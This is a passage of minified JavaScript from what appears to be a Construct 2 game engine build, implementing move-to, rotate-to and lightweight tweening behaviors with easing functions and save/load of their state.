                var i = e ? -this.moveParams.dec : this.moveParams.acc;
                0 != i && this.setCurrentSpeed(this.currentSpeed + i * t);
                var n = this.currentSpeed * t;
                this.remainDistance -= n;
                var r = !1,
                    s = this.target.a,
                    o = Math.cos(s),
                    a = Math.sin(s);
                if (this.remainDistance <= 0 || this.currentSpeed <= 0) r = !0, this.inst.x = this.target.x, this.inst.y = this.target.y, this.currentSpeed > 0 && (this.remainDt = -this.remainDistance / this.currentSpeed), this.getMovingAngle(), this.setCurrentSpeed(0), this.remainDistance = 0;
                else {
                    s = this.target.a;
                    this.inst.x += n * o, this.inst.y += n * a
                }
                this.inst.set_bbox_changed();
                var h = !1;
                if (this.soildStopEnable) {
                    var c = this.runtime.testOverlapSolid(this.inst);
                    c && (this.runtime.registerCollision(this.inst, c), this.runtime.pushOutSolid(this.inst, -o, -a, Math.max(n, 50)), h = !0)
                }
                this.prePosition.x = this.inst.x, this.prePosition.y = this.inst.y, h ? (this.isMoving = !1, this.isMyCall = !0, this.runtime.trigger(cr.behaviors.Rex_MoveTo.prototype.cnds.OnSolidStop, this.inst), this.isMyCall = !1) : r && (this.isMoving = !1, this.isMyCall = !0, this.runtime.trigger(cr.behaviors.Rex_MoveTo.prototype.cnds.OnHitTarget, this.inst), this.isMyCall = !1)
            }
        }, e.tick2 = function () {
            this.movingAngleData.x = this.inst.x, this.movingAngleData.y = this.inst.y
        }, e.setCurrentSpeed = function (t) {
            null != t ? this.currentSpeed = t > this.moveParams.max ? this.moveParams.max : t : 0 == this.moveParams.acc && (this.currentSpeed = this.moveParams.max)
        }, e.resetCurrentPosition = function () {
            var t = this.target.x - this.inst.x,
                e = this.target.y - this.inst.y;
            this.target.a = Math.atan2(e, t), this.remainDistance = Math.sqrt(t * t + e * e), this.prePosition.x = this.inst.x, this.prePosition.y = this.inst.y
        }, e.setTargetPos = function (t, e) {
            this.target.x = t, this.target.y = e, this.setCurrentSpeed(null), this.resetCurrentPosition(), this.movingAngleData.x = this.inst.x, this.movingAngleData.y = this.inst.y, this.isMoving = !0, this.movingAngleStartData.x = this.inst.x, this.movingAngleStartData.y = this.inst.y, this.movingAngleStartData.a = cr.to_clamped_degrees(cr.angleTo(this.inst.x, this.inst.y, t, e)), this.isContinueMode && this.move(this.remainDt)
        }, e.isTickChanged = function () {
            var t = this.runtime.tickcount,
                e = this.lastTick != t;
            return this.lastTick = t, e
        }, e.getMovingAngle = function (t) {
            if (this.isTickChanged()) {
                var e = this.inst.x - this.movingAngleData.x,
                    i = this.inst.y - this.movingAngleData.y;
                0 == e && 0 == i || (this.movingAngleData.a = cr.to_clamped_degrees(Math.atan2(i, e)))
            }
            return this.movingAngleData.a
        }, e.saveToJSON = function () {
            return {
                en: this.enabled,
                v: n(this.moveParams),
                t: n(this.target),
                is_m: this.isMoving,
                c_spd: this.currentSpeed,
                rd: this.remainDistance,
                pp: n(this.prePosition),
                ma: n(this.movingAngleData),
                ms: n(this.movingAngleStartData),
                lt: this.lastTick
            }
        }, e.loadFromJSON = function (t) {
            this.enabled = t.en, this.moveParams = t.v, this.target = t.t, this.isMoving = t.is_m, this.currentSpeed = t.c_spd, this.remainDistance = t.rd, this.prePosition = t.pp, this.movingAngleData = t.ma, this.movingAngleStartData = t.ms, this.lastTick = t.lt
        }, t.cnds = new r, r.prototype.OnHitTarget = function () {
            return this.isMyCall
        }, r.prototype.CompareSpeed = function (t, e) {
            return cr.do_cmp(this.currentSpeed, t, e)
        }, r.prototype.OnMoving = function () {
            return !1
        }, r.prototype.IsMoving = function () {
            return this.enabled && this.isMoving
        }, r.prototype.CompareMovingAngle = function (t, e) {
            return -1 != this.getMovingAngle() && cr.do_cmp(this.getMovingAngle(), t, e)
        }, r.prototype.OnSolidStop = function () {
            return this.isMyCall
        }, t.acts = new s, s.prototype.SetEnabled = function (t) {
            this.enabled = 1 === t
        }, s.prototype.SetMaxSpeed = function (t) {
            this.moveParams.max = t, this.setCurrentSpeed(null)
        }, s.prototype.SetAcceleration = function (t) {
            this.moveParams.acc = t, this.setCurrentSpeed(null)
        }, s.prototype.SetDeceleration = function (t) {
            this.moveParams.dec = t
        }, s.prototype.SetTargetPos = function (t, e) {
            this.setTargetPos(t, e)
        }, s.prototype.SetCurrentSpeed = function (t) {
            this.setCurrentSpeed(t)
        }, s.prototype.SetTargetPosOnObject = function (t) {
            if (t) {
                var e = t.getFirstPicked();
                null != e && this.setTargetPos(e.x, e.y)
            }
        }, s.prototype.SetTargetPosByDeltaXY = function (t, e) {
            this.setTargetPos(this.inst.x + t, this.inst.y + e)
        }, s.prototype.SetTargetPosByDistanceAngle = function (t, e) {
            var i = cr.to_clamped_radians(e),
                n = t * Math.cos(i),
                r = t * Math.sin(i);
            this.setTargetPos(this.inst.x + n, this.inst.y + r)
        }, s.prototype.Stop = function () {
            this.isMoving = !1
        }, s.prototype.SetTargetPosOnUID = function (t) {
            var e = this.runtime.getObjectByUID(t);
            null != e && this.setTargetPos(e.x, e.y)
        }, s.prototype.SetStopBySolid = function (t) {
            this.soildStopEnable = 1 === t
        }, t.exps = new o, o.prototype.Activated = function (t) {
            t.set_int(this.enabled ? 1 : 0)
        }, o.prototype.Speed = function (t) {
            t.set_float(this.currentSpeed)
        }, o.prototype.MaxSpeed = function (t) {
            t.set_float(this.moveParams.max)
        }, o.prototype.Acc = function (t) {
            t.set_float(this.moveParams.acc)
        }, o.prototype.Dec = function (t) {
            t.set_float(this.moveParams.dec)
        }, o.prototype.TargetX = function (t) {
            t.set_float(this.target.x)
        }, o.prototype.TargetY = function (t) {
            t.set_float(this.target.y)
        }, o.prototype.MovingAngle = function (t) {
            t.set_float(this.getMovingAngle())
        }, o.prototype.MovingAngleStart = function (t) {
            t.set_float(this.movingAngleStartData.a)
        }
    }(), cr.behaviors.Rex_RotateTo = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Rex_RotateTo.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}

        function r() {}
        e.onCreate = function () {
            this.activated = 1 == this.properties[0], this.move = {
                max: this.properties[1],
                acc: this.properties[2],
                dec: this.properties[3]
            }, this.target = {
                a: 0,
                cw: !0
            }, this.is_rotating = !1, this.current_speed = 0, this.remain_distance = 0, this.is_my_call = !1
        }, e.tick = function () {
            if (this.activated && this.is_rotating) {
                var t = this.runtime.getDt(this.inst);
                if (0 != t) {
                    var e = !1;
                    if (0 != this.move.dec) {
                        var i = this.current_speed;
                        e = i * i / (2 * this.move.dec) >= this.remain_distance
                    }
                    var n = e ? -this.move.dec : this.move.acc;
                    0 != n && this.SetCurrentSpeed(this.current_speed + n * t);
                    var r = this.current_speed * t;
                    this.remain_distance -= r;
                    var s = !1;
                    this.remain_distance <= 0 || this.current_speed <= 0 ? (this.is_rotating = !1, this.inst.angle = cr.to_clamped_radians(this.target.a), this.SetCurrentSpeed(0), s = !0) : this.target.cw ? this.inst.angle += cr.to_clamped_radians(r) : this.inst.angle -= cr.to_clamped_radians(r), this.inst.set_bbox_changed(), s && (this.is_my_call = !0, this.runtime.trigger(cr.behaviors.Rex_RotateTo.prototype.cnds.OnHitTarget, this.inst), this.is_my_call = !1)
                }
            }
        }, e.tick2 = function () {}, e.SetCurrentSpeed = function (t) {
            null != t ? this.current_speed = t > this.move.max ? this.move.max : t : 0 == this.move.acc && (this.current_speed = this.move.max)
        }, e.SetTargetAngle = function (t, e) {
            this.is_rotating = !0;
            var i = this.inst.angle;
            this.target.cw = 2 == e ? cr.angleClockwise(t, i) : 1 == e;
            var n = 2 == e ? cr.angleDiff(i, t) : 1 == e ? t - i : i - t;
            this.remain_distance = cr.to_clamped_degrees(n), this.target.a = cr.to_clamped_degrees(t), this.SetCurrentSpeed(null)
        }, e.saveToJSON = function () {
            return {
                en: this.activated,
                v: this.move,
                t: this.target,
                ir: this.is_rotating,
                cs: this.current_speed,
                rd: this.remain_distance
            }
        }, e.loadFromJSON = function (t) {
            this.activated = t.en, this.move = t.v, this.target = t.t, this.is_rotating = t.ir, this.current_speed = t.cs, this.remain_distance = t.rd
        }, t.cnds = new i, i.prototype.OnHitTarget = function () {
            return this.is_my_call
        }, i.prototype.CompareSpeed = function (t, e) {
            return cr.do_cmp(this.current_speed, t, e)
        }, i.prototype.OnMoving = function () {
            return !1
        }, i.prototype.IsRotating = function () {
            return this.activated && this.is_rotating
        }, t.acts = new n, n.prototype.SetActivated = function (t) {
            this.activated = 1 == t
        }, n.prototype.SetMaxSpeed = function (t) {
            this.move.max = t, this.SetCurrentSpeed(null)
        }, n.prototype.SetAcceleration = function (t) {
            this.move.acc = t, this.SetCurrentSpeed(null)
        }, n.prototype.SetDeceleration = function (t) {
            this.move.dec = t
        }, n.prototype.SetTargetAngle = function (t, e) {
            this.SetTargetAngle(cr.to_clamped_radians(t), e)
        }, n.prototype.SetCurrentSpeed = function (t) {
            this.SetCurrentSpeed(t)
        }, n.prototype.SetTargetAngleOnObject = function (t, e) {
            if (t) {
                var i = t.getFirstPicked();
                if (null != i) {
                    var n = Math.atan2(i.y - this.inst.y, i.x - this.inst.x);
                    this.SetTargetAngle(n, e)
                }
            }
        }, n.prototype.SetTargetAngleByDeltaAngle = function (t, e) {
            var i = cr.to_clamped_radians(t);
            0 == e && (i = -i);
            var n = this.inst.angle + i;
            this.SetTargetAngle(n, e)
        }, n.prototype.SetTargetAngleToPos = function (t, e, i) {
            var n = Math.atan2(e - this.inst.y, t - this.inst.x);
            this.SetTargetAngle(n, i)
        }, n.prototype.Stop = function () {
            this.is_rotating = !1
        }, t.exps = new r, r.prototype.Activated = function (t) {
            t.set_int(this.activated ? 1 : 0)
        }, r.prototype.Speed = function (t) {
            t.set_float(this.current_speed)
        }, r.prototype.MaxSpeed = function (t) {
            t.set_float(this.move.max)
        }, r.prototype.Acc = function (t) {
            t.set_float(this.move.acc)
        }, r.prototype.Dec = function (t) {
            t.set_float(this.move.dec)
        }, r.prototype.TargetAngle = function (t) {
            var e = this.is_rotating ? this.target.a : 0;
            t.set_float(e)
        }
    }();
var easeOutBounceArray = [],
    easeInElasticArray = [],
    easeOutElasticArray = [],
    easeInOutElasticArray = [],
    easeInCircle = [],
    easeOutCircle = [],
    easeInOutCircle = [],
    easeInBack = [],
    easeOutBack = [],
    easeInOutBack = [],
    litetween_precision = 1e4,
    updateLimit = 0;

function easeOutBouncefunc(t) {
    return (t /= 1) < 1 / 2.75 ? result = 7.5625 * t * t * 1 + 0 : result = t < 2 / 2.75 ? 1 * (7.5625 * (t -= 1.5 / 2.75) * t + .75) + 0 : t < 2.5 / 2.75 ? 1 * (7.5625 * (t -= 2.25 / 2.75) * t + .9375) + 0 : 1 * (7.5625 * (t -= 2.625 / 2.75) * t + .984375) + 0, result
}

function integerize(t, e) {
    return Math.round(t / e * litetween_precision)
}

function easeFunc(t, e, i, n, r, s, o) {
    var a = 0;
    switch (t) {
        case 0:
            a = n * e / r + i;
            break;
        case 1:
            a = n * (e /= r) * e + i;
            break;
        case 2:
            a = -n * (e /= r) * (e - 2) + i;
            break;
        case 3:
            a = (e /= r / 2) < 1 ? n / 2 * e * e + i : -n / 2 * (--e * (e - 2) - 1) + i;
            break;
        case 4:
            a = n * (e /= r) * e * e + i;
            break;
        case 5:
            a = n * ((e = e / r - 1) * e * e + 1) + i;
            break;
        case 6:
            a = (e /= r / 2) < 1 ? n / 2 * e * e * e + i : n / 2 * ((e -= 2) * e * e + 2) + i;
            break;
        case 7:
            a = n * (e /= r) * e * e * e + i;
            break;
        case 8:
            a = -n * ((e = e / r - 1) * e * e * e - 1) + i;
            break;
        case 9:
            a = (e /= r / 2) < 1 ? n / 2 * e * e * e * e + i : -n / 2 * ((e -= 2) * e * e * e - 2) + i;
            break;
        case 10:
            a = n * (e /= r) * e * e * e * e + i;
            break;
        case 11:
            a = n * ((e = e / r - 1) * e * e * e * e + 1) + i;
            break;
        case 12:
            a = (e /= r / 2) < 1 ? n / 2 * e * e * e * e * e + i : n / 2 * ((e -= 2) * e * e * e * e + 2) + i;
            break;
        case 13:
            a = o.optimized ? easeInCircle[integerize(e, r)] : -(Math.sqrt(1 - e * e) - 1);
            break;
        case 14:
            a = o.optimized ? easeOutCircle[integerize(e, r)] : Math.sqrt(1 - (e - 1) * (e - 1));
            break;
        case 15:
            a = o.optimized ? easeInOutCircle[integerize(e, r)] : (e /= r / 2) < 1 ? -n / 2 * (Math.sqrt(1 - e * e) - 1) + i : n / 2 * (Math.sqrt(1 - (e -= 2) * e) + 1) + i;
            break;
        case 16:
            if (o.optimized) a = easeInBack[integerize(e, r)];
            else a = n * (e /= r) * e * (((h = o.s) + 1) * e - h) + i;
            break;
        case 17:
            if (o.optimized) a = easeOutBack[integerize(e, r)];
            else a = n * ((e = e / r - 1) * e * (((h = o.s) + 1) * e + h) + 1) + i;
            break;
        case 18:
            if (o.optimized) a = easeInOutBack[integerize(e, r)];
            else {
                var h = o.s;
                a = (e /= r / 2) < 1 ? n / 2 * (e * e * ((1 + (h *= 1.525)) * e - h)) + i : n / 2 * ((e -= 2) * e * ((1 + (h *= 1.525)) * e + h) + 2) + i
            }
            break;
        case 19:
            if (o.optimized) a = easeInElasticArray[integerize(e, r)];
            else {
                var c = o.a;
                h = 0;
                if (0 == e && (a = i), 1 == (e /= r) && (a = i + n), 0 == (l = o.p) && (l = .3 * r), 0 == c || c < Math.abs(n)) c = n, h = l / 4;
                else h = l / (2 * Math.PI) * Math.asin(n / c);
                a = -c * Math.pow(2, 10 * (e -= 1)) * Math.sin((e * r - h) * (2 * Math.PI) / l) + i
            }
            break;
        case 20:
            if (o.optimized) a = easeOutElasticArray[integerize(e, r)];
            else {
                c = o.a, h = 0;
                if (0 == e && (a = i), 1 == (e /= r) && (a = i + n), 0 == (l = o.p) && (l = .3 * r), 0 == c || c < Math.abs(n)) {
                    c = n;
                    h = l / 4
                } else h = l / (2 * Math.PI) * Math.asin(n / c);
                a = c * Math.pow(2, -10 * e) * Math.sin((e * r - h) * (2 * Math.PI) / l) + n + i
            }
            break;
        case 21:
            if (o.optimized) a = easeInOutElasticArray[integerize(e, r)];
            else {
                var l;
                c = o.a, h = 0;
                if (0 == e && (a = i), 2 == (e /= r / 2) && (a = i + n), 0 == (l = o.p) && (l = r * (.3 * 1.5)), 0 == c || c < Math.abs(n)) {
                    c = n;
                    h = l / 4
                } else h = l / (2 * Math.PI) * Math.asin(n / c);
                a = e < 1 ? c * Math.pow(2, 10 * (e -= 1)) * Math.sin((e * r - h) * (2 * Math.PI) / l) * -.5 + i : c * Math.pow(2, -10 * (e -= 1)) * Math.sin((e * r - h) * (2 * Math.PI) / l) * .5 + n + i
            }
            break;
        case 22:
            a = o.optimized ? n - easeOutBounceArray[integerize(r - e, r)] + i : n - easeOutBouncefunc(r - e / r) + i;
            break;
        case 23:
            a = o.optimized ? easeOutBounceArray[integerize(e, r)] : easeOutBouncefunc(e / r);
            break;
        case 24:
            a = o.optimized ? e < r / 2 ? .5 * (n - easeOutBounceArray[integerize(r - 2 * e, r)] + i) + i : .5 * easeOutBounceArray[integerize(2 * e - r, r)] + .5 * n + i : e < r / 2 ? .5 * (n - easeOutBouncefunc(r - 2 * e) + i) + i : .5 * easeOutBouncefunc((2 * e - r) / r) + .5 * n + i;
            break;
        case 25:
            a = (u = e / r / 2) * u * (3 - 2 * u) * 2;
            break;
        case 26:
            a = (u = (e / r + 1) / 2) * u * (3 - 2 * u) * 2 - 1;
            break;
        case 27:
            var u;
            a = (u = e / r) * u * (3 - 2 * u);
            break
    }
    return s ? n - i - a : a
}! function () {
    for (var t = 0, e = 0, i = 0, n = 0, r = 0, s = 0; s <= litetween_precision; s++) {
        if (n = s / litetween_precision, t = (n /= 1) < 1 / 2.75 ? 7.5625 * n * n * 1 + 0 : n < 2 / 2.75 ? 1 * (7.5625 * (n -= 1.5 / 2.75) * n + .75) + 0 : n < 2.5 / 2.75 ? 1 * (7.5625 * (n -= 2.25 / 2.75) * n + .9375) + 0 : 1 * (7.5625 * (n -= 2.625 / 2.75) * n + .984375) + 0, easeOutBounceArray[s] = t, 0 == (n = s / litetween_precision) && (t = 0), 1 == (n /= 1) && (t = 1), 0 == (i = 0) && (i = .3), 0 == (e = 0) || e < Math.abs(1)) {
            e = 1;
            r = i / 4
        } else r = i / (2 * Math.PI) * Math.asin(1 / e);
        if (t = -e * Math.pow(2, 10 * (n -= 1)) * Math.sin((1 * n - r) * (2 * Math.PI) / i) + 0, easeInElasticArray[s] = t, 0 == (n = s / litetween_precision) && (t = 0), 1 == (n /= 1) && (t = 1), 0 == (i = 0) && (i = .3), 0 == (e = 0) || e < Math.abs(1)) {
            e = 1;
            r = i / 4
        } else r = i / (2 * Math.PI) * Math.asin(1 / e);
        if (t = e * Math.pow(2, -10 * n) * Math.sin((1 * n - r) * (2 * Math.PI) / i) + 1 + 0, easeOutElasticArray[s] = t, 0 == (n = s / litetween_precision) && (t = 0), 2 == (n /= .5) && (t = 1), 0 == (i = 0) && (i = .3 * 1.5 * 1), 0 == (e = 0) || e < Math.abs(1)) {
            e = 1;
            r = i / 4
        } else r = i / (2 * Math.PI) * Math.asin(1 / e);
        t = n < 1 ? e * Math.pow(2, 10 * (n -= 1)) * Math.sin((1 * n - r) * (2 * Math.PI) / i) * -.5 + 0 : e * Math.pow(2, -10 * (n -= 1)) * Math.sin((1 * n - r) * (2 * Math.PI) / i) * .5 + 1 + 0, easeInOutElasticArray[s] = t, n = s / litetween_precision, easeInCircle[s] = -(Math.sqrt(1 - n * n) - 1), n = s / litetween_precision, easeOutCircle[s] = Math.sqrt(1 - (n - 1) * (n - 1)), n = s / litetween_precision, t = (n /= .5) < 1 ? -.5 * (Math.sqrt(1 - n * n) - 1) + 0 : .5 * (Math.sqrt(1 - (n -= 2) * n) + 1) + 0, easeInOutCircle[s] = t, n = s / litetween_precision, 0 == (r = 0) && (r = 1.70158), t = 1 * (n /= 1) * n * ((r + 1) * n - r) + 0, easeInBack[s] = t, 0 == (r = 0) && (r = 1.70158), t = 1 * ((n = (n = s / litetween_precision) / 1 - 1) * n * ((r + 1) * n + r) + 1) + 0, easeOutBack[s] = t, n = s / litetween_precision, 0 == (r = 0) && (r = 1.70158), t = (n /= .5) < 1 ? n * n * ((1 + (r *= 1.525)) * n - r) * .5 + 0 : .5 * ((n -= 2) * n * ((1 + (r *= 1.525)) * n + r) + 2) + 0, easeInOutBack[s] = t
    }
}();
var TweenObject = function (t, e, i, n, r, s, o) {
    this.name = t, this.value = 0, this.setInitial(n), this.setTarget(r), this.easefunc = i, this.tweened = e, this.duration = s, this.progress = 0, this.state = 0, this.onStart = !1, this.onEnd = !1, this.onReverseStart = !1, this.onReverseEnd = !1, this.lastKnownValue = 0, this.lastKnownValue2 = 0, this.enforce = o, this.pingpong = 1, this.flipEase = !1, this.easingparam = [];
    for (var a = 0; a < 28; a++) this.easingparam[a] = {}, this.easingparam[a].a = 0, this.easingparam[a].p = 0, this.easingparam[a].t = 0, this.easingparam[a].s = 0, this.easingparam[a].optimized = !0
};

function trim(t) {
    return t.replace(/^\s\s*/, "").replace(/\s\s*$/, "")
}
TweenObject.prototype = {}, TweenObject.prototype.flipTarget = function () {
        var t = this.initialparam1,
            e = this.initialparam2;
        this.initialparam1 = this.targetparam1, this.initialparam2 = this.targetparam2, this.targetparam1 = t, this.targetparam2 = e, this.lastKnownValue = 0, this.lastKnownValue2 = 0
    }, TweenObject.prototype.setInitial = function (t) {
        this.initialparam1 = parseFloat(t.split(",")[0]), this.initialparam2 = parseFloat(t.split(",")[1]), this.lastKnownValue = 0, this.lastKnownValue2 = 0
    }, TweenObject.prototype.setTarget = function (t) {
        this.targetparam1 = parseFloat(t.split(",")[0]), this.targetparam2 = parseFloat(t.split(",")[1]), isNaN(this.targetparam2) && (this.targetparam2 = this.targetparam1)
    }, TweenObject.prototype.OnTick = function (t) {
        if (0 === this.state) return -1;
        if (1 === this.state && (this.progress += t), 2 === this.state && (this.progress -= t), 3 === this.state && (this.state = 0), 4 !== this.state && 6 !== this.state || (this.progress += t * this.pingpong), 5 === this.state && (this.progress += t * this.pingpong), this.progress < 0) return this.progress = 0, 4 === this.state ? this.pingpong = 1 : 6 === this.state ? (this.pingpong = 1, this.flipEase = !1) : this.state = 0, this.onReverseEnd = !0, 0;
        if (this.progress > this.duration) return this.progress = this.duration, 4 === this.state ? this.pingpong = -1 : 6 === this.state ? (this.pingpong = -1, this.flipEase = !0) : 5 === this.state ? this.progress = 0 : this.state = 0, this.onEnd = !0, 1;
        if (this.flipEase) var e = easeFunc(this.easefunc, this.duration - this.progress, 0, 1, this.duration, this.flipEase, this.easingparam[this.easefunc]);
        else e = easeFunc(this.easefunc, this.progress, 0, 1, this.duration, this.flipEase, this.easingparam[this.easefunc]);
        return e
    }, cr.behaviors.lunarray_LiteTween = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.lunarray_LiteTween.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime, this.i = 0
        };
        var e = t.Instance.prototype;
        e.onCreate = function () {
            this.playmode = this.properties[0], this.active = 1 == this.playmode || 2 == this.playmode || 3 == this.playmode || 4 == this.playmode, this.tweened = this.properties[1], this.easing = this.properties[2], this.target = this.properties[3], this.targetmode = this.properties[4], this.useCurrent = !1, 1 === this.targetmode && (this.target = "relative(" + this.target + ")"), this.duration = this.properties[5], this.enforce = 1 === this.properties[6], this.value = 0, this.tween_list = {}, this.addToTweenList("default", this.tweened, this.easing, "current", this.target, this.duration, this.enforce), 1 === this.properties[0] && this.startTween(0), 2 === this.properties[0] && this.startTween(2), 3 === this.properties[0] && this.startTween(3), 4 === this.properties[0] && this.startTween(4)
        }, e.parseCurrent = function (t, e) {
            void 0 === e && (e = "current");
            var i = trim(e);
            e = trim(e);
            var n = this.value;
            if ("current" === e) switch (t) {
                case 0:
                    i = this.inst.x + "," + this.inst.y;
                    break;
                case 1:
                    i = this.inst.width + "," + this.inst.height;
                    break;
                case 2:
                    i = this.inst.width + "," + this.inst.height;
                    break;
                case 3:
                    i = this.inst.width + "," + this.inst.height;
                    break;
                case 4:
                    i = cr.to_degrees(this.inst.angle) + "," + cr.to_degrees(this.inst.angle);
                    break;
                case 5:
                    i = 100 * this.inst.opacity + "," + 100 * this.inst.opacity;
                    break;
                case 6:
                    i = n + "," + n;
                    break;
                case 7:
                    i = this.inst.x + "," + this.inst.y;
                    break;
                case 8:
                    i = this.inst.x + "," + this.inst.y;
                    break;
                case 9:
                    i = void 0 !== this.inst.curFrame ? this.inst.width / this.inst.curFrame.width + "," + this.inst.height / this.inst.curFrame.height : "1,1";
                    break;
                default:
                    break
            }
            if ("relative" === e.substring(0, 8)) {
                var r = e.match(/\((.*?)\)/);
                if (r) var s = parseFloat(r[1].split(",")[0]),
                    o = parseFloat(r[1].split(",")[1]);
                switch (isNaN(s) && (s = 0), isNaN(o) && (o = 0), t) {
                    case 0:
                        i = this.inst.x + s + "," + (this.inst.y + o);
                        break;
                    case 1:
                        i = this.inst.width + s + "," + (this.inst.height + o);
                        break;
                    case 2:
                        i = this.inst.width + s + "," + (this.inst.height + o);
                        break;
                    case 3:
                        i = this.inst.width + s + "," + (this.inst.height + o);
                        break;
                    case 4:
                        i = cr.to_degrees(this.inst.angle) + s + "," + (cr.to_degrees(this.inst.angle) + o);
                        break;
                    case 5:
                        i = 100 * this.inst.opacity + s + "," + (100 * this.inst.opacity + o);
                        break;
                    case 6:
                        i = n + s + "," + n + s;
                        break;
                    case 7:
                        i = this.inst.x + s + "," + this.inst.y;
                        break;
                    case 8:
                        i = this.inst.x + "," + (this.inst.y + s);
                        break;
                    case 9:
                        i = s + "," + o;
                        break;
                    default:
                        break
                }
            }
            return i
        }, e.addToTweenList = function (t, e, i, n, r, s, o) {
            n = this.parseCurrent(e, n), r = this.parseCurrent(e, r), void 0 !== this.tween_list[t] && delete this.tween_list[t], this.tween_list[t] = new TweenObject(t, e, i, n, r, s, o), this.tween_list[t].dt = 0
        }, e.saveToJSON = function () {
            JSON.stringify(this.tween_list.default);
            return {
                playmode: this.playmode,
                active: this.active,
                tweened: this.tweened,
                easing: this.easing,
                target: this.target,
                targetmode: this.targetmode,
                useCurrent: this.useCurrent,
                duration: this.duration,
                enforce: this.enforce,
                value: this.value,
                tweenlist: JSON.stringify(this.tween_list.default)
            }
        }, TweenObject.Load = function (t, e, i, n, r, s, o, a) {
            var h = new TweenObject(e, i, n, r, s, o, a);
            for (var c in t) h[c] = t[c];
            return h
        }, e.loadFromJSON = function (t) {
            var e = JSON.parse(t.tweenlist),
                i = TweenObject.Load(e, e.name, e.tweened, e.easefunc, e.initialparam1 + "," + e.initialparam2, e.targetparam1 + "," + e.targetparam2, e.duration, e.enforce);
            this.tween_list.default = i, this.playmode = t.playmode, this.active = t.active, this.movement = t.tweened, this.easing = t.easing, this.target = t.target, this.targetmode = t.targetmode, this.useCurrent = t.useCurrent, this.duration = t.duration, this.enforce = t.enforce, this.value = t.value
        }, e.setProgressTo = function (t) {
            for (var e in t > 1 && (t = 1), t < 0 && (t = 0), this.tween_list) {
                var i = this.tween_list[e];
                i.lastKnownValue = 0, i.lastKnownValue2 = 0, i.state = 3, i.progress = t * i.duration;
                var n = i.OnTick(0);
                this.updateTween(i, n)
            }
        }, e.startTween = function (t) {
            for (var e in this.tween_list) {
                var i = this.tween_list[e];
                if (this.useCurrent) {
                    var n = this.parseCurrent(i.tweened, "current"),
                        r = this.parseCurrent(i.tweened, this.target);
                    i.setInitial(n), i.setTarget(r)
                }
                0 === t && (i.progress = 1e-6, i.lastKnownValue = 0, i.lastKnownValue2 = 0, i.onStart = !0, i.state = 1), 1 === t && (i.state = 1), 2 !== t && 4 !== t || (i.progress = 1e-6, i.lastKnownValue = 0, i.lastKnownValue2 = 0, i.onStart = !0, 2 == t && (i.state = 4), 4 == t && (i.state = 6)), 3 === t && (i.progress = 1e-6, i.lastKnownValue = 0, i.lastKnownValue2 = 0, i.onStart = !0, i.state = 5)
            }
        }, e.stopTween = function (t) {
            for (var e in this.tween_list) {
                var i = this.tween_list[e];
                1 === t && (i.progress = 0), 2 === t && (i.progress = i.duration), i.state = 3;
                var n = i.OnTick(0);
                this.updateTween(i, n)
            }
        }, e.reverseTween = function (t) {
            for (var e in this.tween_list) {
                var i = this.tween_list[e];
                1 === t && (i.progress = i.duration, i.lastKnownValue = 0, i.lastKnownValue2 = 0, i.onReverseStart = !0), i.state = 2
            }
        }, e.updateTween = function (t, e) {
            if (0 === t.tweened) t.enforce ? (this.inst.x = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e, this.inst.y = t.initialparam2 + (t.targetparam2 - t.initialparam2) * e) : (this.inst.x += (t.targetparam1 - t.initialparam1) * e - t.lastKnownValue, this.inst.y += (t.targetparam2 - t.initialparam2) * e - t.lastKnownValue2, t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e, t.lastKnownValue2 = (t.targetparam2 - t.initialparam2) * e);
            else if (1 === t.tweened) t.enforce ? (this.inst.width = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e, this.inst.height = t.initialparam2 + (t.targetparam2 - t.initialparam2) * e) : (this.inst.width += (t.targetparam1 - t.initialparam1) * e - t.lastKnownValue, this.inst.height += (t.targetparam2 - t.initialparam2) * e - t.lastKnownValue2, t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e, t.lastKnownValue2 = (t.targetparam2 - t.initialparam2) * e);
            else if (2 === t.tweened) t.enforce ? this.inst.width = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e : (this.inst.width += (t.targetparam1 - t.initialparam1) * e - t.lastKnownValue, t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e);
            else if (3 === t.tweened) t.enforce ? this.inst.height = t.initialparam2 + (t.targetparam2 - t.initialparam2) * e : (this.inst.height += (t.targetparam2 - t.initialparam2) * e - t.lastKnownValue2, t.lastKnownValue2 = (t.targetparam2 - t.initialparam2) * e);
            else if (4 === t.tweened)
                if (t.enforce) {
                    var i = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e;
                    this.inst.angle = cr.clamp_angle(cr.to_radians(i))
                } else {
                    i = (t.targetparam1 - t.initialparam1) * e - t.lastKnownValue;
                    this.inst.angle = cr.clamp_angle(this.inst.angle + cr.to_radians(i)), t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e
                }
            else if (5 === t.tweened) t.enforce ? this.inst.opacity = (t.initialparam1 + (t.targetparam1 - t.initialparam1) * e) / 100 : (this.inst.opacity += ((t.targetparam1 - t.initialparam1) * e - t.lastKnownValue) / 100, t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e);
            else if (6 === t.tweened) t.enforce ? this.value = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e : (this.value += (t.targetparam1 - t.initialparam1) * e - t.lastKnownValue, t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e);
            else if (7 === t.tweened) t.enforce ? this.inst.x = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e : (this.inst.x += (t.targetparam1 - t.initialparam1) * e - t.lastKnownValue, t.lastKnownValue = (t.targetparam1 - t.initialparam1) * e);
